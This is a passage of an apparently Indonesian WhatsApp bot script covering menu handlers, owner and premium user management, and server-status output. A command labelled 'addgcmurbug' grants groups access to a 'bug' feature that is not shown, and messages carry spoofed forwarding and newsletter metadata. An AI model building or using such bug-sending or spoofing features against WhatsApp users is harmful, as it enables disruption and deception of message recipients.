                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}sc`
                                })
                            }
                        ]
                    }
                }
            }, { quoted: contactQ });
        }
        break
        //══════════════════════════════//
        case 'gamesmenu': case 'gamemenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.GameMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //══════════════════════════════//
        case 'groupmenu': case 'grupmenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.GroupMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //══════════════════════════════//
        case 'panelmenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.PanelMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //═══════════════════════════════════//
        case 'instalmenu': case 'installmenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.InstallMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //═══════════════════════════════════//
        case 'paymentmenu': case 'paymenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.GameMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //═══════════════════════════════════//
        case 'funmenu': case 'othermenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.OtherMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //═══════════════════════════════════//
        case 'makemenu': case 'makermenu': {
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: `${Intronya}`,
                    footer: `${global.MakerMenu}\n${global.footer}`,
                    thumbnail: global.thumb,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Whatsapp Creator",
                                  url: `https://${global.nowa}`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                  display_text: "Buy Script", 
                                  id: `${prefix}buysc`
                                })
                            }
                        ]
                    }
                }
            },
            { quoted: contactQ });
        }
        break
        //═══════════════════════════════════//
        case 'tqto': case 'about': {
            const teksnya = 
`\`Thanks To\`S\` ༻

─❲ ㄆ ❳ Thanks To Support ❲ ㄆ ❳─
– Itss Dric ⟦ Creator ⟧
– My Friend ⟦ Support ⟧
– My Partner ⟦ Support ⟧
– My Girl Friend ⟦ Support ⟧
– All User Cancer ⟦ Support ⟧
┗━────────────

`
            await sock.sendMessage(m.chat, {
                interactiveMessage: {
                    title: teksnya,
                    footer: global.footer,
                    thumbnail: global.thumb1,
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardingScore: 250930,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: global.idSaluran,
                            newsletterName: global.namaSaluran,
                            serverId: 999
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                          {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                              display_text: "Creator",
                              url: `https://${global.nowa}`
                            })
                          },
                          {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                              display_text: "My Owner", 
                              id: `${prefix}owner`
                            })
                          }
                        ]
                    }
                }
              },
              { quoted: m });
        };
        break
        //══════════════════════════════//
        //====== OWNER MENU ======//
        //══════════════════════════════//
        case 'public': case 'woii': { 
            if (!isBot && !isDeveloper) return
            sock.public = true;
            reply(`*Bot Aktif*`)
        }
        break;
        //═══════════════════════════════════// 
        case 'self': case 'tidurr': { 
            if (!isBot && !isDeveloper) return
            sock.public = false;
          reply(`*Bot Nonaktif*\n\`Mode Off Diaktifkan\``)
        }
        break;
        //══════════════════════════════════════//
        case 'gconly': case 'gc-only':
        case 'group-only': case 'grup-only': {
            if (!isOwner) return reply("❌ Fitur Khusus Owner")
        
            let mode = getMode().gconly
            let text = (args[0] || "").toLowerCase()
        
            if (!text) {
                return reply(`⚙️ *GCONLY MODE STATUS*
        
Status: ${mode ? "🟢 ON (Group Only)" : "🔴 OFF (Normal)"}
Usage: ${prefix + command} on / off`)
            }
        
            if (text == "on") {
                if (mode) return reply("✔ Sudah aktif sebelumnya")
                setMode(true)
                return reply("🟢 *GCONLY MODE AKTIF*\nBot hanya bisa dipakai di grup")
            }
        
            if (text == "off") {
                if (!mode) return reply("✔ Sudah nonaktif sebelumnya")
                setMode(false)
                return reply("🔴 *GCONLY MODE NONAKTIF*\nBot bisa dipakai di mana saja")
            }
        
            reply(`${noticenya}\nContoh: ${prefix + command} on / off`)
        }
        break
        //═══════════════════════════════════//
        case 'welcome': case 'setwelcome': {
            if (!isOwner) return reply('❌ Hanya Owner yang bisa mengubah pengaturan ini!')
        
            if (!text) {
                return reply(`⚙️ *Pengaturan Welcome*
        
• Status saat ini: *${global.welcome ? "ON" : "OFF"}*
          
Gunakan:
- *${prefix + command} on*
- *${prefix + command} off*`)
            }
            if (text.toLowerCase() === 'on') {
                global.welcome = true
                return reply('✅ Fitur *Welcome* berhasil diaktifkan!')
            } 
            if (text.toLowerCase() === 'off') {
                global.welcome = false
                return reply('❌ Fitur *Welcome* berhasil dimatikan!')
            }
            reply(`Format tidak dikenal!\nGunakan *${prefix + command} on* atau *${prefix + command} off*`)
        }
        break;
        //═══════════════════════════════════//
        case 'antidemote': {
            if (!isOwner) return reply('khusus owner')
            if (!text) return reply('on / off')
        
            global.antidemote = text.toLowerCase() === 'on'
            reply(`🛡️ Anti Demote Owner: ${global.antidemote ? 'AKTIF' : 'NONAKTIF'}`)
        }
        break
        //═══════════════════════════════════//
        case 'totalfitur': case 'allfitur': {
          await reply(`Fitur saat ini ada *${totalFitur()} Fitur*`)
        }
        break
        //═══════════════════════════════════//
        case "addowner":
        case "addown": {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
            prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            let nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknya = await sock.onWhatsApp(prrkek)
            if (ceknya.length == 0) return reply(`\`*Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!*\``)
            newOwner.push(prrkek)
            fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
            reply(`*Nomor \`${nomernya}\` Telah Menjadi Owner Bot!!*`)
        }
        break
        //══════════════════════════════════════//
        case "delowner":
        case "delown": {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
            ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            let nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = newOwner.indexOf(ya)
            newOwner.splice(unp, 1)
            fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(newOwner))
            reply(`*Nomor \`${nomernya}\` Telah Di Hapus Dari Database Owner Bot!*`)
        }    
        break
        //══════════════════════════════════════//
        case "addprem": case 'addpremium': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            let nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknya = await sock.onWhatsApp(prrkek)
            if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            premium.push(prrkek)
            fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
            reply(`Nomor \`${nomernya}\` Telah Menjadi Premium!`)
        }
        break
        //══════════════════════════════════════//
        case "delprem": case 'delpremium': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            let nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = premium.indexOf(ya)
            premium.splice(unp, 1)
            fs.writeFileSync("./lib/Database/premium.json", JSON.stringify(premium))
            reply(`Nomor \`${nomernya}\` Telah Di Hapus Premium!`)
        }
        break
        //══════════════════════════════════════//
        case 'addgcseller': case 'addseller': {
            if (!isOwner) return reply(msg.owner)
            pler.push(m.chat)
            fs.writeFileSync('./engine/Storage/idgrup.json', JSON.stringify(pler))
            
            var member = groupMetadata.participants.map(e => e.id);
            await sock.sendMessage(m.chat, {
                text: `｢ *${global.botname}* ｣\n\n> Success Active To Create panel Server 1\n`, 
                contextInfo: {
                isForwarded: true, 
                mentionedJid: member, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran 
                    }, 
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Medan, Sumatra Utara`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,     
                        mediaType: 1,
                        renderLargerThumbnail: false,
                    },
                }
            }, { quoted : m })
        }
        break
        //═══════════════════════════════════// 
        case 'addgcseller2': case 'addseller2': {
            if (!isOwner) return reply(msg.owner)
            plerr.push(m.chat)
            fs.writeFileSync('./engine/Storage/idgrup2.json', JSON.stringify(plerr))
            
            var member = groupMetadata.participants.map(e => e.id);
            await sock.sendMessage(m.chat, {
                text: `｢ *${global.botname}* ｣\n\n> Success Active To Create panel Server Private\n`, 
                contextInfo: {
                isForwarded: true, 
                mentionedJid: member, 
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idSaluran,
                        newsletterName: global.namaSaluran 
                    }, 
                    externalAdReply: {
                        title: `${global.dev} — Assistant`,
                        body: `📍 Rahasia, Adalah`,
                        thumbnailUrl: global.thumb,
                        sourceUrl: global.linkSaluran,     
                        mediaType: 1,
                        renderLargerThumbnail: false,
                    },
                }
            }, { quoted : m })
        }
        break
        //═══════════════════════════════════//
        case 'addpt': case 'addptpanel': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknya = await sock.onWhatsApp(prrkek)
            if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            ptpanel.push(prrkek)
            fs.writeFileSync("./lib/Database/ptPanel.json", JSON.stringify(ptpanel))
            reply(`Nomor \`${nomernya}\` Telah Menjadi Partner Panel!`)
        }
        break
        //═══════════════════════════════════//
        case "delpt": case 'delptpanel': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = ptpanel.indexOf(ya)
            ptpanel.splice(unp, 1)
            fs.writeFileSync("./lib/Database/ptPanel.json", JSON.stringify(ptpanel))
            reply(`Nomor \`${nomernya}\` Telah Di Hapus Dari PT PANEL di SERVER!`)
        }
        break
        //═══════════════════════════════════//
        case 'addpt2': case 'addptpanel2': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknya = await sock.onWhatsApp(prrkek)
            if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            ptpanel2.push(prrkek)
            fs.writeFileSync("./lib/Database/ptPanel2.json", JSON.stringify(ptpanel2))
            reply(`Nomor \`${nomernya}\` Telah Menjadi PT PANEL!`)
        }
        break
        //═══════════════════════════════════//
        case "delpt2": case 'delptpanel2': {
            if (!isOwner) return reply(msg.owner)
            if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
            ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
            nomernya = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = ptpanel2.indexOf(ya)
            ptpanel2.splice(unp, 1)
            fs.writeFileSync("./lib/Database/ptPanel2.json", JSON.stringify(ptpanel2))
            reply(`Nomor \`${nomernya}\` Telah Di Hapus Dari PT PANEL di SERVER PRIVATE!`)
        }
        break
        //═══════════════════════════════════//
        case "delgcseller": case "delseller": {
            if (!isOwner) return reply(msg.owner)
            pler.splice(m.chat)
            fs.writeFileSync("./lib/Database/idgrup.json", JSON.stringify(pler))
            reply(`｢ *${global.botname}* ｣\n\n> Seluruh Member Grup Kini Tidak Dapat Mengakses *BOT*, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
        }
        break
        //═══════════════════════════════════//
        case "delgcseller2": case "delseller2": {
            if (!isOwner) return reply(msg.owner)
            plerr.splice(m.chat)
            fs.writeFileSync("./lib/Database/idgrup2.json", JSON.stringify(plerr))
            reply(`｢ *${global.botname}* ｣\n\n> Seluruh Member Grup Kini Tidak Dapat Mengakses *BOT*, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
        }
        break
        //═══════════════════════════════════//
        case 'addgcmurbug': {
            if (!isOwner) return reply(msg.owner)
            if (!isGroup) return reply("Khusus Group")
            Murbug.push(m.chat)
            fs.writeFileSync('./engine/Storage/murbug.json', JSON.stringify(Murbug))
            reply(`｢ *${global.botname}* ｣\n\n> Seluruh Member Mempunya Akses Bug`)
        }
        break
        //═══════════════════════════════════//
        case "delgcmurbug": {
            if (!isOwner) return reply(msg.owner)
            if (!isGroup) return reply("Khusus Group")
            Murbug.splice(m.chat)
            fs.writeFileSync("./lib/Database/murbug.json", JSON.stringify(Murbug))
            reply(`｢ *${global.botname}* ｣\n\n> Seluruh Member Grup Kini Tidak Dapat Mengakses *BOT*, Silahkan Chat Owner Bot Untuk Membeli Akses!`)
        }
        break
        //═══════════════════════════════════//
        case 'devbot': case 'owner': case 'own': case 'dev': {
            var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                contactMessage: {
                  displayName: global.dev,
                  vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${global.dev}\nitem1.TEL;waid=${global.Kontak}:+${global.Kontak}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:${global.botname}\nX-WA-BIZ-NAME:[[${global.dev} ]]\nEND:VCARD`
                }
            }), {
                userJid: m.chat,
                quoted: contactQ 
            })
            sock.relayMessage(m.chat, contact.message, {
                messageId: contact.key.id
            })
        }
        break
        //═════════════════════════════════════//
        //═══════════════════════════════════//
        case 'server': {
        
            // UPTIME BOT
            const uptime = process.uptime()
            const days = Math.floor(uptime / 86400)
            const hours = Math.floor(uptime % 86400 / 3600)
            const minutes = Math.floor(uptime % 3600 / 60)
            const seconds = Math.floor(uptime % 60)
        
            // CPU
            const cpuModel = os.cpus()[0].model
            const cpuCores = os.cpus().length
        
            // RAM
            const totalRam = os.totalmem()
            const freeRam = os.freemem()
            const usedRam = totalRam - freeRam
        
            const ramTotalGB = (totalRam / 1024 / 1024 / 1024).toFixed(2)
            const ramUsedGB = (usedRam / 1024 / 1024 / 1024).toFixed(2)
            const ramFreeGB = (freeRam / 1024 / 1024 / 1024).toFixed(2)
            const ramUsage = ((usedRam / totalRam) * 100).toFixed(1)
        
            // PROCESS
            const memoryUsage = process.memoryUsage()
            const rss = (memoryUsage.rss / 1024 / 1024).toFixed(2)
            const heapUsed = (memoryUsage.heapUsed / 1024 / 1024).toFixed(2)
            const heapTotal = (memoryUsage.heapTotal / 1024 / 1024).toFixed(2)
        
            const text = `═[🔴 *B O T   S T A T U S* ]
────────────────────
◈ ᴜᴘᴛɪᴍᴇ : ${days}d ${hours}h ${minutes}m ${seconds}s
◈ ʀᴇsᴘᴏɴsᴇ : ${latensi.toFixed(2)} ms
◈ ɴᴏᴅᴇ.js : ${process.version}
────────────────────
═[🔴 *S E R V E R   S T A T U S* ]
────────────────────
◈ ᴠᴘs ᴜᴘᴛɪᴍᴇ : ${runtime(os.uptime())}s
◈ ᴘʟᴀᴛғᴏʀᴍ : ${os.platform()}
◈ ᴏs ʀᴇʟᴇᴀsᴇ : ${os.release()}
◈ ᴄᴘᴜ ᴍᴏᴅᴇʟ : ${cpuModel}
◈ ᴄᴘᴜ : ${cpuCores} cores
────────────────────
═[🔴 *R A M* ]
────────────────────
◈ ᴜsᴇᴅ : ${ramUsedGB} GB
◈ ғʀᴇᴇ : ${ramFreeGB} GB
◈ ᴛᴏᴛᴀʟ : ${ramTotalGB} GB
◈ ᴜsᴀɢᴇ : ${ramUsage}% (🟢 NORMAL)
────────────────────
═[🔴 *P R O C E S S* ]
────────────────────
◈ ʀss : ${rss} MB
◈ ʜᴇᴀᴘ : ${heapUsed} MB
◈ ᴛᴏᴛᴀʟ ʜᴇᴀᴘ : ${heapTotal} MB`.trim()

            reply(text)
        }
        break
        //═════════════════════════════//
        case "ping": case "os": {
            try {
                const THEME = {
                    bg: "#0f1419", bgSecondary: "#1a1f2e", card: "#1e2433", cardHover: "#252b3d",
                    primary: "#3b82f6", success: "#10b981", warning: "#f59e0b", danger: "#ef4444",
                    purple: "#8b5cf6", cyan: "#06b6d4", pink: "#ec4899", textPrimary: "#f1f5f9",
                    textSecondary: "#94a3b8", textTertiary: "#64748b", border: "#2d3548", glow: "rgba(59, 130, 246, 0.2)"
                };
        
                const formatSize = (bytes) => {
                    if (bytes === 0) return '0 B';
                    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
                    const i = Math.floor(Math.log(bytes) / Math.log(1024));
                    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
                };
        
                const formatTime = (seconds) => {
                    seconds = Number(seconds);
                    const d = Math.floor(seconds / (3600 * 24));
                    const h = Math.floor(seconds % (3600 * 24) / 3600);
                    const m = Math.floor(seconds % 3600 / 60);
                    const s = Math.floor(seconds % 60);
                    if (d > 0) return `${d}d ${h}h ${m}m`;
                    if (h > 0) return `${h}h ${m}m`;
                    return `${m}m ${s}s`;
                };
        
                function drawBackground(ctx, w, h) {
                    const gradient = ctx.createLinearGradient(0, 0, w, h);
                    gradient.addColorStop(0, THEME.bg);
                    gradient.addColorStop(0.5, THEME.bgSecondary);
                    gradient.addColorStop(1, THEME.bg);
                    ctx.fillStyle = gradient;
                    ctx.fillRect(0, 0, w, h);
                    ctx.globalAlpha = 0.02;
                    for (let i = 0; i < 100; i++) {
                        const x = Math.random() * w;
                        const y = Math.random() * h;
                        const size = Math.random() * 2;
                        ctx.fillStyle = THEME.textPrimary;
                        ctx.beginPath();
                        ctx.arc(x, y, size, 0, Math.PI * 2);
                        ctx.fill();
                    }
                    ctx.globalAlpha = 1;
                    ctx.strokeStyle = THEME.border;
                    ctx.lineWidth = 1;
                    for (let i = 0; i < w; i += 50) {
                        ctx.globalAlpha = 0.03;
                        ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, h); ctx.stroke();
                    }
                    for (let i = 0; i < h; i += 50) {
                        ctx.globalAlpha = 0.03;
                        ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(w, i); ctx.stroke();
                    }
                    ctx.globalAlpha = 1;
                }
        
                function drawCard(ctx, x, y, w, h, radius) {
                    ctx.save();
                    ctx.shadowColor = THEME.glow;
                    ctx.shadowBlur = 15;
                    ctx.beginPath();
                    ctx.roundRect(x, y, w, h, radius);
                    ctx.fillStyle = THEME.card;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                    ctx.strokeStyle = THEME.border;
                    ctx.lineWidth = 1;
                    ctx.stroke();
                    ctx.restore();
                }
        
                function drawIcon(ctx, x, y, type, color) {
                    ctx.save();
                    ctx.strokeStyle = color;
                    ctx.fillStyle = color;
                    ctx.lineWidth = 2.5;
                    ctx.lineCap = 'round';
                    ctx.lineJoin = 'round';
                    switch (type) {
                        case 'cpu':
                            ctx.strokeRect(x - 12, y - 12, 24, 24);
                            ctx.fillRect(x - 6, y - 6, 12, 12);
                            ctx.beginPath();
                            ctx.moveTo(x - 12, y - 8); ctx.lineTo(x - 16, y - 8);
                            ctx.moveTo(x - 12, y); ctx.lineTo(x - 16, y);
                            ctx.moveTo(x - 12, y + 8); ctx.lineTo(x - 16, y + 8);
                            ctx.moveTo(x + 12, y - 8); ctx.lineTo(x + 16, y - 8);
                            ctx.moveTo(x + 12, y); ctx.lineTo(x + 16, y);
                            ctx.moveTo(x + 12, y + 8); ctx.lineTo(x + 16, y + 8);
                            ctx.stroke();
                            break;
                        case 'memory':
                            for (let i = 0; i < 4; i++) { ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24); }
                            break;
                        case 'disk':
                            ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                            ctx.beginPath(); ctx.arc(x, y, 8, 0, Math.PI * 2); ctx.stroke();
                            ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2); ctx.fill();
                            break;
                        case 'network':
                            ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                            ctx.beginPath(); ctx.moveTo(x, y - 8); ctx.lineTo(x, y + 8);
                            ctx.moveTo(x - 8, y); ctx.lineTo(x + 8, y); ctx.stroke();
                            ctx.beginPath(); ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
                            ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
                            ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
                            ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
                            ctx.fill();
                            break;
                        case 'server':
                            for (let i = 0; i < 3; i++) {
                                ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                                ctx.beginPath(); ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2); ctx.fill();
                            }
                            break;
                        case 'clock':
                            ctx.beginPath(); ctx.arc(x, y, 12, 0, Math.PI * 2); ctx.stroke();
                            ctx.beginPath(); ctx.moveTo(x, y); ctx.lineTo(x, y - 8);
                            ctx.moveTo(x, y); ctx.lineTo(x + 6, y); ctx.stroke();
                            break;
                    }
                    ctx.restore();
                }
        
                function drawLogo(ctx, x, y, size) {
                    ctx.save();
                    const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
                    gradient.addColorStop(0, THEME.primary);
                    gradient.addColorStop(0.5, THEME.cyan);
                    gradient.addColorStop(1, THEME.purple);
                    ctx.strokeStyle = gradient;
                    ctx.lineWidth = 3;
                    ctx.lineCap = 'round';
                    ctx.beginPath(); ctx.moveTo(x - size, y); ctx.lineTo(x, y - size); ctx.lineTo(x + size, y); ctx.lineTo(x, y + size); ctx.closePath(); ctx.stroke();
                    ctx.beginPath(); ctx.moveTo(x - size / 2, y); ctx.lineTo(x, y - size / 2); ctx.lineTo(x + size / 2, y); ctx.lineTo(x, y + size / 2); ctx.closePath(); ctx.stroke();
                    ctx.restore();
                }
        
                function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
                    ctx.save();
                    ctx.lineCap = 'round';
                    ctx.beginPath(); ctx.arc(x, y, radius, 0, Math.PI * 2);
                    ctx.strokeStyle = THEME.bgSecondary; ctx.lineWidth = lineWidth; ctx.stroke();
                    const startAngle = -Math.PI / 2;
                    const endAngle = startAngle + (Math.PI * 2 * (percent / 100));
                    ctx.shadowColor = color; ctx.shadowBlur = 10;
                    ctx.beginPath(); ctx.arc(x, y, radius, startAngle, endAngle);
                    ctx.strokeStyle = color; ctx.lineWidth = lineWidth; ctx.stroke();
                    ctx.shadowBlur = 0;
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 28px Arial";
                    ctx.textAlign = "center"; ctx.textBaseline = "middle";
                    ctx.fillText(`${Math.round(percent)}%`, x, y);
                    ctx.restore();
                }
        
                function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
                    ctx.fillStyle = THEME.bgSecondary; ctx.fillRect(x, y, w, h);
                    const gradient = ctx.createLinearGradient(x, y, x + w, y);
                    gradient.addColorStop(0, color); gradient.addColorStop(1, color + 'aa');
                    ctx.fillStyle = gradient; ctx.fillRect(x, y, w * (percent / 100), h);
                    ctx.strokeStyle = THEME.border; ctx.lineWidth = 1; ctx.strokeRect(x, y, w, h);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x, y - 6);
                    ctx.fillStyle = THEME.textPrimary; ctx.font = "bold 11px Arial"; ctx.textAlign = "right"; ctx.fillText(value, x + w, y - 6);
                }
        
                function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
                    drawCard(ctx, x, y, w, h, 12);
                    drawIcon(ctx, x + 28, y + 28, iconType, color);
                    ctx.fillStyle = THEME.textSecondary; ctx.font = "11px Arial"; ctx.textAlign = "left"; ctx.fillText(label, x + 50, y + 22);
